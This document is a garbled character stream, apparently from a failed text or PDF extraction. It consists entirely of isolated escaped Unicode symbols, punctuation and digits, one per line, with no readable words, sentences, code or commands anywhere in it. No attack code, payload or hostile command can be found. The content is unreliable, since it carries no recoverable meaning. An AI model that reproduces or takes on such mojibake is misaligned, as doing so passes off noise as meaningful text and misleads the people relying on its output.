n\u00fa\n\ufb02\n\u2021\nH\n\ufb02\n\u2030\nH\nH\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n0\n>\n\u00fa\n\u2030\n\ufb02\n>\n\u00f6\n\u00c7\n\u00fa\n\ufb02\n;\n>\n\u00fa\nT\n\u00f6\n~\n\ufb02\n0\n\u00b1\nH\n\u00bc\n\ufb02\n\u00c7\n0\nH\n\u00e2\n;\n>\n\u00fa\n\u2030\nH\n\ufb02\n\u2021\n\u00bc\n\u00fa\n\u00c7\n/\nT\n\ufb02\n;\n4\n>\n\u00f6\n,\n>\n\u00c7\n\u00b3\n\u00fa\n;\n>\n\u00fa\n\u2030\n\u2030\n\ufb02\nH\n>\n\u00c7\n\u00e2\n;\n>\n0\n\ufb02\n,\n0\n\ufb02\n;\n\ufb02\n\u00fa\nH\n\ufb02\n\u2030\n\u00c7\n\u00fa\n0\n\ufb02\nt\n\ufb02\n0\n;\n\ufb02\n\u2021\n\u00bc\n0\n\u00fa\n\u00e2\n\u00b3\n\u00c7\n\u2021\n>\n\u00e2\n0\n\u2030\n\ufb02\n0\nH\n\u00bc\n\u00c7\n\u00b3\n\u00bc\n\u00e2\n\u00c7\n\u00b3\n\u00bc\nH\nH\n\u00bc\n\ufb02\n\u00b3\n0\nT\n,\n;\n\u00f6\n;\nH\n0\n\ufb02\n\u2021\n\ufb02\n\u00fa\nH\n>\n\u2021\nH\n\u00c7\nt\n\u00c7\nH\n\u00c7\n\ufb02\n;\n=\n\ufb02\n\u00e2\n\u00c7\nt\n\ufb02\n0\n\u2021\n>\n\u00fa\n\u2030\nF\n,\n\u00e2\n\u00c7\nH\n>\nH\n\u00c7\n\u00fa\n\ufb02\n-\nI\n\ufb02\n\u00f7\n~\n\ufb02\n1\n\u00c2\n\u00bf\n\u00c1\n\u00c9\n\u00c9\n\u00fa\n\ufb02\n,\nH\n\ufb02\n\u00f6\n~\n\ufb02\n0\n\u00bb\n\u00c0\n>\n\u00fa\n\u2030\n\u00bb\n\u00c5\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00fb\n0\n\u00b1\n,\n\u00c7\n\u00fa\nH\n\u2030\n\ufb02\nH\n\ufb02\n\u2021\nH\n\ufb02\n\u2030\n>\n\u00fa\n\u2030\n~\n\u00e2\n\u2021\n\u00db\n\ufb02\n\u2030\n;\n,\n\ufb02\n>\n0\n,\n\u00bc\n\u00c7\n;\n\u00bc\n\u00c7\n\u00fa\n\u00b3\n\ufb02\n\u00f6\n>\n\u00c7\n\u00e2\n;\n\u00b1\n0\n\u00f6\nH\n\u00bc\n\u00c7\n;\n\u00b3\n0\nT\n,\nH\n>\n0\n\u00b3\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\n>\n&\n;\n\u00bc\n\u00c7\n,\n~\nT\n\u00c7\n\u00e2\n\u2030\n\u00c7\n\u00fa\n\u00b3\n\u2021\n\u00f6\n,\n>\n\u00fa\n\u2021\n>\n\u00fa\n\u2030\n>\n&\nT\n\u00fa\n\u00c7\nt\n\ufb02\n0\n;\n\u00c7\nH\n\u2021\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n\u2021\n\ufb02\n\u00fa\nH\n\ufb02\n0\nw\n\u00c7\nH\n\u00bc\n\u00f6\n\u00c7\n\u00e2\n\u00c7\nH\n>\n0\n\u2021\nH\n\u00c7\n\ufb02\n;\nF\n>\n\u00f6\n,\n\u00e2\n\ufb02\n\ufb02\n\u00f6\n>\n\u00c7\n\u00e2\n;\nT\n;\n\ufb02\n\u2030\nH\n\u00bc\n\ufb02\n;\nT\n~\n\u00d9\n\ufb02\n\u2021\nH\n,\n,\n\u00e2\n\u2021\n\u00b1\n0\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\u00fa\n;\n\u00bc\n\u00c7\n,\n,\n;\n\u00c7\nH\n\u00c7\n\u00fa\n>\n\u00fa\n\u2030\n\u2021\n\u00fa\nH\n>\n\u00c7\n\u00fa\n\ufb02\n\u2030\n>\n\u00fa\n>\nH\nH\n>\n\u2021\n\u00bc\n\u00f6\n\ufb02\n\u00fa\nH\n0\n\ufb02\n;\nT\n\u00f6\n\ufb02\n0\nH\n\u00b1\n\u00fa\nH\n\u00bc\n\ufb02\n0\n>\nH\nH\n>\n\u2021\n\u00bc\n\u00f6\n\ufb02\n\u00fa\nH\n\u00ff\n\u00b0\n&\n2\nj\n\u00c7\n\ufb02\n\u00e2\n\u2030\n\u00b0\n\u00b3\n2\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00b9\n\u00c4\n\u00f8\n\u00bc\n\u00bb\n\u2030\n\u2021\n\u2021\n\u00fa\nH\n>\n\u00c7\n\u00fa\n\ufb02\n\u2030\n>\n\u02d9\n0\n,\n\ufb02\n\u2030\n0\n\ufb02\n\u2021\nt\n\ufb02\n0\n\u2021\n\ufb02\n,\n\ufb02\n0\n\u00c7\n\u00f6\n\ufb02\n\u00fa\nH\n\u00e2\nT\n0\n\ufb02\n\u02d9\n\u00bc\n\ufb02\n>\nH\nH\n>\n\u2021\n\u00bc\n\u00f6\n\ufb02\n\u00fa\nH\n;\n\ufb02\n,\n\u00e2\n\u00c7\nH\n\ufb02\n\u2030\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00c4\n\u00c3\n\u00c0\n\u00c5\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\nw\n>\n;\n\u2030\n\u00c7\n;\n\u2021\nt\n\ufb02\n0\n\ufb02\n\u2030\n>\n\u00fa\n\u2030\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n\ufb02\n\u2030\n\u00fa\n\u00e2\n\u2021\n\u00b1\n\u00c7\nt\n\ufb02\n\u2030\n>\n\u2021\n;\n,\n0\n\u00c7\n0\nH\nH\n\u00bc\n\ufb02\n\u2021\n>\n\u00f6\n,\n>\n\u00c7\n\u00b3\n\u00fa\n\u00ec\n\u00bb\n\u00ed\n j\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c1\nF\n\u2022\n>\n\u00f7\n-\n\u00e3\n\ufb02\n>\nI\nI\n>\n\u2021\n\u00bd\n\u00f7\n\ufb02\n\u00fb\nI\n1\n\ufb02\n<\nU\n\u00f7\n\ufb02\n1\nI\n\u00b1\n\u00b1\n1\n\u00f7\n\ufb02\n-\nI\n\ufb02\n\u00f7\n~\n\ufb02\n1\n\u00c2\n\u00bf\n\u00c1\n\u00c9\n\u2021\n>\n\u00f7\n-\n>\n\u00c8\n\u00b4\n\u00fb\nU\n\u00b4\nU\n<\nI\n\u00c2\n\u00bf\n\u00c1\n\u00c9\n0\n\ufb02\nH\nw\n\ufb02\n\ufb02\n\u00fa\nT\n\u00b3\nT\n;\nH\n\u00bc\n>\n\u00fa\n\u2030\n\u00be\nH\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n;\n\ufb02\n\u00fa\nH\nH\n>\n0\n\u00b3\n\ufb02\nH\n\ufb02\n\u2030\n;\n,\n\ufb02\n>\n0\n,\n\u00bc\n\u00c7\n;\n\u00bc\n\u00c7\n\u00fa\n\u00b3\n\ufb02\n\u00f6\n>\n\u00c7\n\u00e2\n;\n\u2021\n\u00fa\nH\n>\n\u00c7\n\u00fa\n\u00c7\n\u00fa\n\u00b3\n\u00f6\n>\n\u00e2\n\u00c7\n\u2021\n\u00c7\nT\n;\n&\n\u00ff\n\u00b0\n;\n\u00e2\n\u00c7\n\u00fa\n\u00db\n\u00c7\n\u00fa\n\u00b3\nH\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\nH\n\u00f6\nT\n\u00e2\nH\n\u00c7\n,\n\u00e2\n\ufb02\n\u2030\n\ufb02\n\u00b1\n\ufb02\n\u00fa\n;\n\ufb02\n\u2021\n\u00fa\nH\n0\n>\n\u2021\nH\n0\n;\n\u00f6\n\ufb02\n\u00b1\nH\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n\u00c7\nt\n\u00c7\nH\n\u2021\nw\n>\n;\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n\ufb02\n\u2030\n>\n\u00fa\n\u2030\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\n~\n\u2021\n>\n\u00b1\n\ufb02\n\u00e2\n\u00e2\nw\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n\ufb02\n0\n\u00ec\n\u00bc\n\u00ed\n\u00ba\n>\n\u00fa\n\u2021\n\u00b1\nH\n\u00bc\n\ufb02\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\n4\n\u00e5\n4\n\u2030\n\u00f6\n>\n\u00c7\n\u00fa\n;\n>\n\u00fa\n\u2030\n,\n>\n\u2021\n\u00e2\n>\n\u2030\n\u2030\n\u00f6\n>\n\u00c7\n\u00fa\n;\n>\n~\nT\n;\n\ufb02\n\u2030\nH\n\u00bc\n\ufb02\n~\n0\n>\n\u00fa\n\u2030\n\u00b1\n>\n\u00f6\n>\n\u00d9\n0\n,\n0\nt\n\u00c7\n\u2030\n\ufb02\n0\n\u00b1\n;\n\u00bc\n\u00c7\n,\n;\n;\nT\n~\n\u00f6\n>\n0\n\u00c7\n\u00fa\n\ufb02\n;\n>\n\u00fa\n\u2030\nH\n\u00bc\n\ufb02\n0\nt\n\ufb02\n;\n;\n\ufb02\n\u00e2\n;\nw\n\u00c7\nH\n\u00bc\n\u00f6\n\u00c7\n\u00e2\n\u00c7\nH\n>\n0\n\u2021\n>\n,\n,\n\u00e2\n\u00c7\n\u2021\n>\nH\n\u00c7\n\u00fa\n;\n\u00f6\n\ufb02\n\u00b1\nH\n\u00bc\n\ufb02\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\n\ufb02\n,\n\u00e2\n\u00c7\nH\n\ufb02\n\u2030\n4\nM\nF\n\u00f8\n\u00bc\n\u00b9\n\u00bb\n\u00c3\n\u00f8\n\u00b9\n\u00bb\n\u00c5\n\u00c5\nH\n\u2030\n\ufb02\n\u00e2\n\u00c7\nt\n\ufb02\n0\nH\n\u00bc\n\ufb02\n,\n>\n\u2021\n\u00e2\n>\n\u2030\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c2\n\u00c9\n\u00fb\n\ufb02\n\u00b1\nI\n\u00bd\n\ufb02\n\u2030\n\u2021\nU\n\u00f7\n\ufb02\n\u00fb\nI\n<\n\u00c8\n\u00fb\nu\n\u00e3\nu\n\ufb02\n\u2030\n\u00c8\n\u00fb\nI\n\u00bd\n\ufb02\n\u2021\n>\n\u00f7\n-\n>\n\u00c8\n\u00b4\n\u00fb\nU\n<\n\ufb02\n\u2030\n\u00ba\n\u00c8\n\u2021\n1\n<\n\u00b1\nI\n\u00e3\n\u00c8\n\u2021\n\ufb02\n\u00fb\n<\n\u00c8\n\u00fb\n\u00b4\n\u00e3\nU\n1\n\ufb02\n<\n-\nU\n1\n-\n1\nI\n\u00c8\n\u00fb\n\u00b4\nI\n~\n\ufb02\n\u00b1\n1\n\u00f7\n>\nx\n\ufb02\n\u00e3\n\u00e3\n\u00ee\n\u00dc\n\u00fb\nx\n\u00fb\n<\n\u00bd\n\u00c8\n-\n~\nU\n\u00c8\n\u00e3\n\u2030\n\ufb02\n1\n\u00e0\n<\n\u00bd\n>\n\u00c2\n\u00c6\n\u00c7\n\u00c1\n\u00b1\n\u00c1\n\ufb02\n\ufb02\n\u00b9\n\u00bb\n\ufb02\n\u00c5\n\u2030\n\u2021\n\u00bc\n\u2030\n\u00c4\n\u2021\n\u00be\n\u2021\n\u00bc\n\u00c1\n\u00b9\n\ufb02\n\u00b1\n\u00be\n\u00bb\n\u00bd\n\u00bb\n\u00b1\n\ufb02\n\u00c4\n\u00c4\n\u2030\n\u2021\n\u00bb\n\u00c0\n\u00bc\n\ufb02\n\u00c0\n\u00bd\n\ufb02\n\ufb02\n\u00c4\n>\n\u00b1\n\u2030\n\u00bd\n\ufb02\n\u00c1\n\u00c1\n\ufb02\n\u00c5\n\u00bc\n\u2030\n\u00be\n\ufb02\n\u00bb\n~\n\u00b1\n\u00c0\n\u00b1\n\u2030\n\u00bc\n\ufb02\n\u00c5\n\u00bc\n\u00e1\n\u00c9\nH\n\u00bc\n\ufb02\n0\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\nw\n\ufb02\n0\n\ufb02\n\u00ba\n\u00c7\n\u2021\n0\n;\n\u00b1\nH\n\u00fb\nT\n~\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n0\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\nH\n\u00bc\n>\nH\n0\n\ufb02\n\u00e2\n\u00c7\n\ufb02\n\u2030\n\u00fa\n;\n\u2021\n\u00c7\n>\n\u00e2\n\ufb02\n\u00fa\n\u00b3\n\u00c7\n\u00fa\n\ufb02\n\ufb02\n0\n\u00c7\n\u00fa\n\u00b3\n\u02d9\n\u00bc\n\ufb02\n,\nH\n\ufb02\n\u00fa\nH\n\u00c7\n>\n\u00e2\nt\n\u00c7\n\u2021\nH\n\u00c7\n\u00f6\n;\nw\n\ufb02\n0\n\ufb02\n\u00e2\nT\n0\n\ufb02\n\u2030\n\u00c7\n\u00fa\nH\n;\nH\n>\n0\nH\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\n\ufb02\n\u00f6\n~\n\ufb02\n\u2030\n\u2030\n\ufb02\n\u2030\n\u00fb\nw\n\ufb02\n0\n\u00fb\n\u00c7\n\u00fa\nH\n,\n0\n\ufb02\n;\n\ufb02\n\u00fa\nH\n>\nH\n\u00c7\n\u00fa\n\u00f6\nt\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\ufb02\n\u00f6\nT\n;\n\ufb02\nH\nH\n0\n\u00c7\n\u00b3\n\u00b3\n\ufb02\n0\n\ufb02\n\ufb02\n\u2021\nT\nH\n\u00c7\n\u00fa\n\u00b1\n>\n\u00fa\n\ufb02\n\u00f6\n~\n\ufb02\n\u2030\n\u2030\n\ufb02\n\u2030\n\u00a7\n>\nt\n>\n\u2021\n0\n\u00c7\n,\nH\n\u00ec\n\u00c0\n\u00ed\n>\n\u00fa\n\u2030\nH\n\u00bc\n\ufb02\n\u00fa\n,\n0\n\ufb02\n;\n;\n\u00c7\n\u00fa\n\u00b3\nF\n\u00fa\n>\n~\n\u00e2\n\ufb02\n\u00c7\n\u00fa\n>\nw\n>\n0\n\u00fa\n\u00c7\n\u00fa\n\u00b3\n\u2030\n\u00c7\n>\n\u00e2\n\u00b3\nH\n\u2021\n>\nT\n;\n\ufb02\nH\n\u00bc\n\ufb02\n,\n>\n\u2021\n\u00e2\n>\n\u2030\n\u2030\nw\n\u00fa\n\u00e2\n>\n\u2030\n\u02d9\n\u00bc\n\ufb02\n\u00fb\nT\n~\n\u00e2\n\u00c7\n;\n\u00bc\n\ufb02\n0\n\u00b1\n\u00c7\n\u00e2\n\ufb02\n;\nw\n\ufb02\n0\n\ufb02\n,\n0\n\u00e2\n\u2021\n\u2021\n0\n>\n\u00b1\nH\n\ufb02\n\u2030\n0\n\ufb02\n\u00e2\n\u00c7\n\ufb02\n\u2030\n\u00fa\n\u00f6\nT\n\u00e2\nH\n\u00c7\n,\n\u00e2\n\ufb02\nT\n;\n\ufb02\n0\n\u00c7\n\u00fa\nH\n\ufb02\n0\n>\n\u2021\nH\n\u00c7\n\u00fa\n;\n>\n\u00fa\n\u2030\n\u2021\n\u00fa\nH\n>\n\u00c7\n\u00fa\n\ufb02\n\u2030\n\u00f6\nT\n\u00e2\nH\n\u00c7\n,\n\u00e2\n\ufb02\n\u00b3\n0\n>\n\u00f6\n\u00f6\n>\nH\n\u00c7\n\u2021\n>\n\u00e2\n>\n\u00fa\n\u2030\nH\n\u2021\n,\n\u00b3\n0\n>\n,\n\u00bc\n\u00c7\n\u2021\n\ufb02\n0\n0\n0\n;\n j\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c3\n\u00fb\nU\n~\n\u00e3\n\u00c8\n<\n\u00bd\n\ufb02\n1\n\u2030\n\u2021\nU\n\u00f7\n\ufb02\n\u00fb\nI\n\u2030\n\ufb02\n\u00e3\n\u00c8\nu\n\ufb02\n1\n\ufb02\n\u2030\nu\n\u00c8\n>\n>\n\u00e3\n\u00c8\n\u00fb\n\u00dc\n\u00c8\n\u00fb\n\ufb02\n\u00f7\n>\n\u00c8\n\u00e3\n\u00c8\n<\n\u00c8\n\u00fb\nI\n>\n\u00e3\n\u00c8\n>\n\u00fb\n>\n\u00fb\n\u2030\n\u00c8\n<\n>\n<\n\u00c8\n\u00f7\n-\n\u00e3\n\ufb02\n1\n\ufb02\nU\n<\n\ufb02\n\u00b1\n>\n<\nI\nU\n\u2030\n\ufb02\n\u00fb\nI\n\u00ff\n<\nx\n1\n\u00dc\nj\n\ufb02\n~\n1\nU\n>\n1\n\u2026\n\u00c2\n\u00bf\n\u00c1\n\u00c6\nj\n0\n\u00f6\nj\n\ufb02\n~\n0\nT\n>\n0\n\u2021\nH\n\u00c9\n\u2021\nH\n~\n\ufb02\n0\n\u00b1\n\u00bc\n\u00b9\n\u00bb\n\u00c0\nT\n0\n\u2021\n\u00e2\n\u00e2\n\ufb02\n>\n\u00b3\nT\n\ufb02\n;\n>\nH\nj\n\u00f8\n\ufb02\n\u2021\nT\n0\n\ufb02\n>\n\u00fa\n\u2030\n\u00ba\n\u2021\n\u00b1\n\ufb02\n\ufb02\n0\n\ufb02\n,\n0\nH\n\ufb02\n\u2030\n\u00fa\n\u2021\n>\n\u00f6\n,\n>\n\u00c7\n\u00b3\n\u00fa\n;\n\u00ec\n\u00bd\n\u00ed\n\u00ec\n\u00be\n\u00ed\n~\n\u2021\nH\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n0\nH\n>\n0\n\u00b3\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\nT\nH\n\u00bc\n4\n\u00bc\n\u00c7\n\u00fa\n>\n\ufb02\n>\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\ufb02\n;\nH\n;\n=\nT\n0\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\u00c7\n;\nH\n\u00c7\n\u00f6\n\ufb02\nH\n\u00bc\n\ufb02\n\u00b3\n0\nT\n,\nT\nH\n\u00c7\n\u00e2\n\u00c7\n\u201c\n\ufb02\n\u2030\n\u00ba\n\u00c7\n\u2021\n0\n;\n\u00b1\nH\nF\n\u2021\n\ufb02\n\u00e2\n>\n\u00fa\n\u2030\nP\n0\n\u2030\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\nw\n\u00c7\nH\n\u00bc\n\u00f6\n>\n\u2021\n0\n;\nH\nH\n>\n0\n\u00b3\n\ufb02\nH\nH\n\u00bc\n\ufb02\n\u00fb\n\u00bc\n\u00c7\n\u00e2\n\u00c7\n,\n,\n\u00c7\n\u00fa\n\ufb02\n;\n=\n\ufb02\n,\n>\n0\nH\n\u00f6\n\ufb02\n\u00fa\nH\n\u00b1\n\u00a7\nT\n;\nH\n\u00c7\n\u2021\n\ufb02\n\u00fb\nF\n4\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n\ufb02\n0\n;\n>\n\u00fa\n\u2030\n>\n\u00fa\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\u00fa\n>\nH\n\u00c7\n\u00fa\n>\n\u00e2\n\u00e2\n>\nw\n\u00b1\n\u00c7\n0\n\u00f6\n\u02d9\n>\n0\n\u00b3\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\n\u00b1\nH\n\u00bc\n\ufb02\n;\n\ufb02\n\u2021\n\u00f6\n,\n>\n\u00fa\n\u00c7\n\ufb02\n;\n\u00c7\n;\n\u2030\n\u00c7\n\u00b1\n\u00b1\n\ufb02\n0\n\ufb02\n\u00fa\nH\n\u00b1\n0\n\u00f6\nH\n\u00bc\n>\nH\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\nw\n\ufb02\nH\n\u2021\n,\n\u00c7\n\u2021\n>\n\u00e2\n\u00e2\n\u2021\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u00b1\n0\nH\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n0\n\u02d8\n\u00bc\nw\n\ufb02\nt\n\ufb02\n0\n\u00c7\nH\n;\nH\n\u00c7\n\u00e2\n\u00e2\n\u2021\n\ufb02\n\u00fa\nH\n\ufb02\n0\n;\n>\n0\nT\n\u00fa\n\u2030\n\u00f6\n>\n0\n\u00c7\n\u00fa\n\ufb02\n>\n\u00fa\n\u2030\n\u00fa\n>\nt\n>\n\u00e2\n\u00c7\n;\n;\nT\n\ufb02\n;\n>\n;\n0\n\ufb02\n\u00e2\n>\nH\n\ufb02\n\u2030\nH\nT\nH\n\u00bc\n4\n\u00bc\n\u00c7\n\u00fa\n>\n;\n\ufb02\n>\n,\n\u00e2\n\u00c7\nH\n\u00c7\n\u2021\n;\nj\n\u00c8\n\u00b4\nU\n1\n\ufb02\n\u00c4\nF\n\u2022\n>\n\u00f7\n-\n\u00e3\n\ufb02\n>\nI\nI\n>\n\u2021\n\u00bd\n\u00f7\n\ufb02\n\u00fb\nI\n=\n\u00c9\n\u00a7\nI\n>\n\u00b1\n\u00b1\n~\n\u00fb\nU\n<\n\u0160\n\u00a7\n>\n\u00fb\nU\n>\n1\n\u2026\n\u00c1\n\u00c3\n\u00c2\n\u00bf\n\u00c1\n\u00c6\n\u2022\n\u00e3\n<\n\u00c8\n\u00f7\n\u00c8\n\u00e3\n>\n1\nI\nI\n\u00bd\n\u00c8\n<\n\u2030\n\u2021\nU\n\u00f7\n\ufb02\n\u00fb\nI\n>\nI\nI\n>\n\u2021\n\u00bd\n\u00f7\n\ufb02\n\u00fb\nI\n\u00f7\n<\nI\n\u00b1\nI\n\u00bd\n\ufb02\n>\nI\nI\n>\n\u2021\n\u00bd\n\u00f7\n\ufb02\n\u00fb\nI\n<\n\u00c8\n\u00fb\nI\n\u00bd\n\u00c8\n<\n\u2021\n>\n\u00f7\n-\n>\n\u00c8\n\u00b4\n\u00fb\n\u2030\n\u00c8\n\u2030\n\u00fb\nI\n\u2021\n\u00fb\nI\n>\n\u00c8\n\u00fb\n\u00f7\n\ufb02\n>\n\u00fb\n\u00c8\n\u00fb\n\u00b4\n\u00b1\nU\n\u00e3\n\u2021\n\u00fb\nI\n\ufb02\n\u00fb\nI\n\u00be\nu\n\ufb02\n\u00f7\n~\n\ufb02\n1\n\u00c2\n\u00bf\n\u00c1\n\u00c4\n\u02d9\n\u00bc\n\ufb02\n,\n\ufb02\n0\n\u00c7\n\u2030\n~\n\ufb02\nH\nw\n\ufb02\n\ufb02\n\u00fa\n\u00be\nt\n\ufb02\n\u00f6\n~\n\ufb02\n0\n\u00bc\n\u00b9\n\u00bb\n\u00be\n>\n\u00fa\n\u2030\n\u00a7\n>\n\u00fa\nT\n>\n0\n\u2021\n\u00bc\n\u00b9\n\u00bb\n\u00c0\n\u00f6\n>\n0\n\u00db\n\ufb02\n\u2030\n\u00fa\n\ufb02\n\u00b1\nH\n\u00bc\n\ufb02\n\ufb02\n>\n0\n\u00e2\n\u00c7\n\ufb02\n0\n\u00c7\n\u00fa\n;\nH\n>\n\u00fa\n\u2021\n\ufb02\n;\n\u00c7\n\u00fa\nw\n\u00bc\n\u00c7\n\u2021\n\u00bc\n\u00fb\n0\n\u00b1\n,\n\u00c7\n\u00fa\nH\n~\n;\n\ufb02\n0\nt\n\ufb02\n\u2030\n,\n\ufb02\n0\n;\n\u00c7\n;\nH\n\ufb02\n\u00fa\nH\n\ufb02\n,\n\u00e2\n\u00c7\nH\n>\nH\n\u00c7\n\u00fa\n>\nH\nH\n\ufb02\n\u00f6\n,\nH\n;\n~\n\u2021\nH\n\u00bc\n\u00c7\n;\n>\n\u2021\nH\n0\n\u02d9\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n\u00b3\n\ufb02\n\u00fa\n\ufb02\n0\n>\n\u00e2\n\u00e2\n\u2021\n\ufb02\n\u00f6\n>\n\u00c7\n\u00e2\n\ufb02\n\u2030\n\u00ba\n\u00c7\n\u2021\n0\n;\n\u00b1\nH\nF\n\u2021\n\ufb02\n\u00e2\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\nw\n\u00c7\nH\n\u00bc\n\u00f6\n>\n\u00e2\n\u00c7\n\u2021\n\u00c7\nT\n;\n\u00f6\n>\n\u2021\n0\n;\nH\n&\nT\n\u00fa\n\u00c7\nt\n\ufb02\n0\n;\n\u00c7\nH\n\u00c7\n\ufb02\n;\nw\n\u00c7\nH\n\u00bc\n\u00f6\n\u00c7\n\u00e2\n\u00c7\nH\n>\n0\n\u2021\n\u00c7\n\u00fa\nH\n\ufb02\n0\n\ufb02\n;\nH\n;\n\u00f6\n;\nH\n\u00b1\n0\n\ufb02\n/\nT\n\ufb02\n\u00fa\nH\n\u00e2\n\u2021\n0\n\ufb02\n\u00e2\n>\nH\n\ufb02\n\u2030\nH\nH\n\u00bc\n\ufb02\n\u00be\n>\nt\n\u2021\n\u02d9\n\u00bc\n\ufb02\n>\n\u2021\nH\n0\n>\n\u00e2\n;\n\u2021\n\u2021\n>\n;\n\u00c7\n\u00fa\n>\n\u00e2\n\u00e2\n\u2021\nT\n;\n\ufb02\n\u2030\n\u00f6\n>\n\u2021\n0\n\u00f8\n\u00e2\n>\n\u2030\n\ufb02\n\u00fa\n\u00ba\n\u00c7\n\u2021\n0\n;\n\u00b1\nH\nP\n0\n\u2030\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\nH\nH\n>\n0\n\u00b3\n\ufb02\nH\nH\n\u00bc\n\ufb02\n0\n&\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n>\n\u00fa\n\u2030\n\u2030\n\ufb02\nt\n\ufb02\n\u00e2\n,\n\u00f6\n\ufb02\n\u00fa\nH\n0\n\u00b3\n>\n\u00fa\n\u00c7\n\u201c\n>\nH\n\u00c7\n\u00fa\n;\nw\n\u00c7\nH\n\u00bc\n\u00f6\n\u00c7\n\u00e2\n\u00c7\nH\n>\n0\n\u2021\n>\n\u00fa\n\u2030\n\u00c7\n\u00fa\nH\n\ufb02\n\u00e2\n\u00e2\n\u00c7\n\u00b3\n\ufb02\n\u00fa\n\u2021\n\ufb02\nH\n\u00c7\n\ufb02\n;\n\u2030\nT\n0\n\u00c7\n\u00fa\n\u00b3\nH\n\u00bc\n\u00c7\n;\n,\n\ufb02\n0\n\u00c7\n\u2030\nF\n\u00f6\n>\n\u00c7\n\u00e2\n;\nw\n\ufb02\n0\n\ufb02\n\u00b1\nH\n\ufb02\n\u00fa\nt\n\ufb02\n0\n\u2021\n;\n\u00c7\n\u00f6\n,\n\u00e2\n\ufb02\nw\n\u00c7\nH\n\u00bc\n>\n\u00b3\n0\n\ufb02\n\ufb02\nH\n\u00c7\n\u00fa\n\u00b3\n>\n\u00fa\n\u2030\n>\n\u00fa\n>\nH\nH\n>\n\u2021\n\u00bc\n\u00f6\n\ufb02\n\u00fa\nH\n\u00c9\n\u00fa\nH\n\u00bc\n\ufb02\n0\n\u2021\n\u2021\n>\n;\n\u00c7\n\u00fa\n;\n\u00c7\nH\n>\n,\n,\n\ufb02\n>\n0\n;\nH\n\u00bc\n>\nH\nH\n\u00bc\n\ufb02\n>\nH\nH\n>\n\u2021\n\u00db\n\ufb02\n0\n;\nT\n;\n\ufb02\n\u2030\n\u00bc\n\u00c7\n\u00b3\n\u00bc\n\u00e2\n\u2021\nH\n,\n\u00c7\n\u2021\n>\n\u00e2\n\u00e2\nT\n0\n\ufb02\n;\n~\n>\n;\n\ufb02\n\u2030\n\u00fa\n\u2021\nT\n0\n0\n\ufb02\n\u00fa\nH\n\ufb02\nt\n\ufb02\n\u00fa\nH\n;\n0\n\u00e2\n\ufb02\n\u00b3\n\u00c7\nH\n\u00c7\n\u00f6\n>\nH\n\ufb02\n\u2030\n\u2021\nT\n\u00f6\n\ufb02\n\u00fa\nH\n;\n;\nH\n\u00e2\n\ufb02\n\u00fa\n\u00b1\n0\n\u00f6\n,\n0\n\ufb02\nt\n\u00c7\nT\n;\nt\n\u00c7\n\u2021\nH\n\u00c7\n\u00f6\n;\n\u00b0\nT\n0\n\ufb02\nH\n,\n\u00c7\n\u2021\n;\n\u00c7\n\u00fa\n\u2021\n\u00e2\nT\n\u2030\n\ufb02\n\u2030\n;\n\u2021\n\u00f6\n,\n;\n\u00c7\n>\nH\n\u00bc\n\ufb02\n\u00be\n>\nt\n\u2021\n\u02d9\n>\n\u00fa\n\u2030\n0\n\ufb02\n\u00e2\n\ufb02\nt\n>\n\u00fa\nH\n0\n\ufb02\n;\n\ufb02\n>\n0\n\u2021\n\u00bc\n 